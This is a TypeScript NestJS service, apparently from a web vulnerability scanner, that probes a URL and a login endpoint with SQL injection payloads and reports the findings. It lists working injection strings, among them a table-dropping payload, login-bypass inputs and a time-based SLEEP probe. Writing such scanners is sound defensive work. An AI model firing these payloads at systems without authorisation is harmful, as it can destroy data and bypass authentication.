import { Injectable } from "@nestjs/common";
import { Severity, TestStatus } from "@prisma/client";
import axios from "axios";


const PAYLOADS = [`' OR '1'='1`,
    `'; DROP TABLE users; --`,
    `' UNION SELECT NULL--`,
    `1' AND SLEEP(5)--`,]

const ERROR_SIGNATURES = ['sql syntax', 'mysql_fetch', 'ORA-01756', 'PostgreSQL', 'ODBC SQL']
const LOGIN_PAYLOADS = [
    { email: `' OR 1=1--`, password: 'x' },
    { email: `admin'--`, password: 'x' }]

@Injectable()
export class SqlInjectionService {
    async run(url: string, loginendPoint?: string) {
        const findings: {}[] = []

        for (const payload of PAYLOADS) {
            const testUrl = `${url}?id=${encodeURIComponent(payload)}`
            const start = Date.now()
            const res = await axios.get(testUrl, { timeout: 8000, validateStatus: () => true })
            const duration = Date.now() - start

            const bodyText = String(res.data).toLowerCase()
            const errorText = ERROR_SIGNATURES.some((sig) => bodyText.includes(sig.toLowerCase()))
            const timeBased = payload.includes("SLEEP") && duration > 4000

            if (errorText || timeBased) {
                findings.push({ payload, errorText, timeBased, duration })
            }
        }
        if (loginendPoint) {
            for (const body of LOGIN_PAYLOADS) {
                const res = await axios.post(loginendPoint, body, { timeout: 8000, validateStatus: () => true })
                const bodyText = JSON.stringify(res.data).toLowerCase()
                const bypassed = res.status === 200 && (bodyText.includes("token") || bodyText.includes("authentication"))
                if (bypassed) {
                    findings.push({ type: "LOGIN_BYPASS", payload: body, status: res.status })
                }
            }
        }
        return {
            status: findings.length ? TestStatus.FAILED : TestStatus.PASSED,
            severity: findings.length ? Severity.CRITICAL : null,
            data: { findings }
        }
    }
}